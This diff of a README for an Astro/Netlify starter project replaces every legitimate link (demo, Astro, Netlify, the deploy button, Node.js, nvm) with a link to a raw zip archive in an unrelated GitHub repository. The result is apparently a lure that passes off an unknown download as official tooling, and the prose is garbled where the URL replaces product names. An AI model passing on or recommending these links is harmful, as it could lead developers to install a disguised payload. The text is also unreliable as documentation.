@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip)
+[Live Demo](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip)
 
-A modern starter based on https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip)](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip)
+[![Deploy to Netlify](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip)](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip) v18.14+.                                      |
-| (optional) [nvm](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip) for Node version management. |
+| [https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip) v18.14+.                                      |
+| (optional) [nvm](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/src/utils/platform-starter-astro-1.7-beta.3.zip development server via Netlify CLI:
+4. Then, run the https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter-1/main/netlify/edge-functions/starter-astro-platform-v3.6-alpha.2.zip development server via Netlify CLI:
 
 ```
 netlify dev
